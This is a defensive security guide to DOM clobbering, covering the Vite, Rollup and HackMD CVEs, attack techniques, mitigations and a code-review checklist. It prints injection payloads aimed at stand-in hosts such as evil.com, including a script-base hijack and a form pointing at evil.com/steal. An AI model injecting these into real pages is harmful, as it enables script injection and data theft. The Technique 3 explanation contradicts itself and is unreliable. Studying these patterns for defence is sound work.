# DOM Clobbering Attacks in Modern Frameworks

> **Category:** DOM-Based Attacks  
> **Language:** JavaScript / TypeScript  
> **Severity:** Medium to High  
> **CVEs covered:** CVE-2024-45812 (Vite), CVE-2024-47068 (Rollup), CVE-2024-38354 (HackMD/CodiMD)

## Overview

DOM Clobbering is a code-reuse attack where seemingly benign HTML elements (like `<img>` tags with `name` or `id` attributes) "clobber" (overwrite) DOM properties that JavaScript relies on. By injecting non-script HTML, an attacker can alter global variables (`window` properties), `document` references, and even the behavior of modern build tooling.

### How DOM Clobbering Works

```javascript
// Without DOM clobbering:
console.log(window.someVariable);  // undefined

// With DOM clobbering — inject:
// <a id="someVariable" href="http://evil.com/data">
console.log(window.someVariable);  // <a> element
console.log(window.someVariable.href);  // "http://evil.com/data"
```

The browser's named access on the `Window` object means every element with an `id` or `name` attribute becomes accessible as a `window` property.

---

## CVE-2024-45812: Vite DOM Clobbering XSS

**CVSS:** 6.4 (Medium)  
**Source:** https://nvd.nist.gov/vuln/detail/CVE-2024-45812 • GHSA-64vr-g452-qvp3

### Description

Vite, the popular frontend build tool, had a DOM Clobbering vulnerability in bundled scripts when output format was `cjs`, `iife`, or `umd`. The vulnerability existed because Vite used `document.currentScript` to resolve asset URLs — a DOM property that can be clobbered by attacker-controlled HTML elements.

### The Mechanism

When Vite bundles scripts with dynamic imports, it generates code like:

```javascript
// Vite generated output (cjs/iife/umd format)
const base = document.currentScript && document.currentScript.src || '/';
const __vite_asset__url = new URL('./asset.js', base).href;
```

An attacker can clobber `document.currentScript` by injecting a named element before the script tag:

```html
<!-- Attacker-injected HTML -->
<img name="currentScript" src="http://evil.com/malicious.js">
<!-- The actual Vite-bundled script -->
<script src="/assets/app-legacy.js"></script>
```

When `document.currentScript` is accessed, it returns the `<img>` element instead of the script element. The `src` attribute of the `<img>` tag becomes the base URL for resolving asset imports.

### Vulnerable Build Configuration

```javascript
// vite.config.js — VULNERABLE configurations
export default {
  build: {
    rollupOptions: {
      output: {
        format: 'iife'  // Also: 'cjs', 'umd'
      }
    }
  }
}
```

### Exploit Example

```html
<!-- User-injected content (e.g., blog comment) -->
<img id="currentScript" src="http://attacker.com/">

<!-- Vite-bundled script on the page -->
<script src="/assets/index-DD7ef2a5.js"></script>
<!-- The script's document.currentScript resolves to the <img> tag -->
<!-- Asset URLs now use attacker's domain as base -->
<!-- XSS achieved when script loads attacker-controlled assets -->
```

### Fixed Version

```javascript
// Upgrade to Vite >= 5.4.6, 5.3.6, 5.2.14, 4.5.5, or 3.2.11

// The fix checks that currentScript is actually a <script> element
// and falls back to import.meta.url for ES modules
```

**References:**
- https://nvd.nist.gov/vuln/detail/CVE-2024-45812
- https://github.com/vitejs/vite/security/advisories/GHSA-64vr-g452-qvp3
- https://github.com/vitejs/vite/commit/ade1d89660e17eedfd35652165b0c26905259fad

---

## CVE-2024-47068: Rollup DOM Clobbering

**CVSS:** 6.1 (Medium)  
**Source:** https://nvd.nist.gov/vuln/detail/CVE-2024-47068 • GHSA-gcx4-mw62-g8wm

### Description

Rollup (the bundler powering Vite, among others) had its own DOM Clobbering vulnerability when bundling scripts that use `import.meta` properties in `cjs`/`umd`/`iife` format. The vulnerability affected Rollup versions before 2.79.2, 3.29.5, and 4.22.4.

### Vulnerable Code in Rollup

```javascript
// Rollup's generated output for import.meta.url (vulnerable)
const url = 
  typeof document !== 'undefined' 
    ? document.currentScript && document.currentScript.src 
    : '';
// Same clobbering issue: document.currentScript can be shadowed
```

### Affected Rollup Pattern

```javascript
// Any code using import.meta.url that gets compiled to CJS/UMD/IIFE
// Original source:
const worker = new Worker(new URL('./worker.js', import.meta.url));

// Rollup output (vulnerable):
const worker = new Worker(
  new URL(
    './worker.js',
    document.currentScript && document.currentScript.src || ''
  )
);
// document.currentScript can be clobbered!
```

### Fix

```javascript
// Upgrade to Rollup >= 2.79.2, 3.29.5, or 4.22.4
// The fix uses a try/catch with import.meta.url as fallback,
// and validates document.currentScript is a script element
```

**References:**
- https://nvd.nist.gov/vuln/detail/CVE-2024-47068
- https://github.com/rollup/rollup/security/advisories/GHSA-gcx4-mw62-g8wm

---

## CVE-2024-38354: HackMD/CodiMD DOM Clobbering

**CVSS:** 6.3 (Medium)  
**Source:** https://www.usenix.org/system/files/usenixsecurity25-liu-zhengyu.pdf

### Description

HackMD (a collaborative markdown editor) and its open-source variant CodiMD were vulnerable to DOM Clobbering that could escalate to stored XSS. The vulnerability existed because user-generated markdown content could include HTML elements with `id` or `name` attributes that clobbered the application's JavaScript variables.

### The Attack Chain

```typescript
// 1. Attacker posts a markdown comment with:
// <a id="config" href="http://evil.com/config.json">

// 2. Application code accesses window.config — now clobbered!
// (simplified vulnerable code)
interface AppConfig {
  apiBase: string;
}

let config: AppConfig;
if (window.config) {
  // window.config is now the <a> element, not the config object
  config = /* some code that tries to read from the clobbered value */;
}
```

### Detection via Concolic Analysis

This vulnerability was discovered by researchers using **concolic testing** (dynamic symbolic execution) to automatically discover DOM Clobbering gadgets in real-world applications. Their paper at USENIX Security 2025 showed that DOM Clobbering gadgets are far more prevalent than previously thought.

**References:**
- https://www.usenix.org/system/files/usenixsecurity25-liu-zhengyu.pdf — Detecting and Exploiting DOM Clobbering Gadgets via Concolic Testing
- https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html — OWASP cheat sheet

---

## DOM Clobbering Techniques

### Technique 1: Form Element Clobbering

```html
<!-- The FORM element's named access creates clobbering -->
<form id="loginForm">
  <input name="action" value="http://evil.com/steal">
</form>

<script>
  // This references the clobbered input, not the intended action
  document.loginForm.action.value; // "http://evil.com/steal"
</script>
```

### Technique 2: Anchor href Clobbering

```html
<!-- Anchor elements expose their href property on window -->
<a id="apiBase" href="http://evil.com/">

<script>
  if (window.apiBase) {
    // window.apiBase.href is "http://evil.com/" — not the intended API URL
    fetch(window.apiBase + "/users") // -> http://evil.com/users
  }
</script>
```

### Technique 3: HTML + SVG Clobbering

```html
<!-- Multiple elements with same id: first in DOM wins -->
<div id="cdnDomain">legit.com</div>
<svg>
  <foreignobject>
    <html id="cdnDomain">evil.com</html>
  </foreignobject>
</svg>

<script>
  // document.getElementById('cdnDomain') returns the SVG <html> element
  // because it appears later and overrides the retrieval
  console.log(document.getElementById('cdnDomain').innerText); // "evil.com"
</script>
```

### Technique 4: Service Worker Clobbering

```javascript
// Combining DOM Clobbering with Service Worker registration
// See service-worker-attacks.md for full details

// If the page passes config via innerText of hidden divs:
// <div id="cdnDomain" style="display:none">legit.com</div>
// Attacker injects:
// <html id="cdnDomain">evil.com</html>

// Service worker registers with attacker-controlled domain
navigator.serviceWorker.register(
  `/sw.js?cdnDomain=${document.getElementById('cdnDomain').innerText}`
);
```

---

## Prevention

### Defense 1: Explicit Property Checks

```javascript
// VULNERABLE
if (window.someConfig) {
  init(window.someConfig);
}

// SECURE: Use hasOwnProperty to avoid clobbered properties
if (Object.prototype.hasOwnProperty.call(window, 'someConfig')) {
  init(window.someConfig);
}

// OR use undefined comparison
if (window.someConfig !== undefined) {
  // Still slightly vulnerable—can be clobbered to undefined
}
```

### Defense 2: Use Strict Local Variables

```javascript
// VULNERABLE: Implicit global access
function getConfig() {
  return config;  // Could resolve to window.config
}

// SECURE: Always use explicit local declarations
function getConfig() {
  const localConfig = { apiBase: '/api/' };
  return localConfig;
}
```

### Defense 3: Content Security Policy

```html
<!-- CSP can partially mitigate DOM Clobbering -->
<meta http-equiv="Content-Security-Policy" content="
  script-src 'self' 'nonce-abc123';
  base-uri 'self';
  require-trusted-types-for 'script';
">
```

### Defense 4: Framework-Specific Protections

```typescript
// Angular: DomSanitizer properly handles DOM access
import { DomSanitizer } from '@angular/platform-browser';

// React: JSX doesn't use named DOM access for global resolution

// Svelte: Compiled templates avoid runtime DOM lookups

// Vue: $el and template refs are controlled
```

### Defense 5: Build Tool Hardening

```javascript
// vite.config.js — SECURE configuration
export default {
  build: {
    // Use ESM format (not vulnerable to DOM Clobbering)
    rollupOptions: {
      output: {
        format: 'es'  // NOT 'iife', 'cjs', or 'umd'
      }
    }
  },
  // Upgrade to latest versions
}
```

---

## DOM Clobbering Gadget Detection

### Automated Detection

```javascript
// Scan for vulnerable patterns
function detectDOMClobberingGadgets() {
  const vulnerablePatterns = [
    'document.currentScript',
    'document.getElementById(',
    'window.',
    'self.',
    'globalThis.'
  ];
  // ... scan bundles for these patterns
}
```

### Manual Code Review Checklist

| Pattern | Risk Level | Example |
|---------|-----------|---------|
| `document.currentScript.src` | 🔴 Critical | Vite/Rollup CVE pattern |
| `window[userControlled]` | 🔴 Critical | Direct property access |
| `document.getElementById(id)` with tainted `id` | 🟡 High | Service worker attacks |
| Global variable without `let/const/var` | 🟡 High | Implicit globals |
| `if (someVar)` without `undefined` check | 🟡 Medium | Falsy values clobbered |
| `typeof` checks | 🟢 Low | `typeof` is immune |

---

## References

1. https://nvd.nist.gov/vuln/detail/CVE-2024-45812 — Vite DOM Clobbering CVE
2. https://nvd.nist.gov/vuln/detail/CVE-2024-47068 — Rollup DOM Clobbering CVE
3. https://www.usenix.org/system/files/usenixsecurity25-liu-zhengyu.pdf — DOM Clobbering Gadget Detection (USENIX 2025)
4. https://portswigger.net/web-security/dom-based/dom-clobbering — PortSwigger DOM clobbering guide
5. https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html — OWASP DOM Clobbering Prevention
6. https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering — Service Worker + DOM clobbering chain
7. https://scnps.co/papers/sp23_domclob.pdf — DOM Clobbering research paper
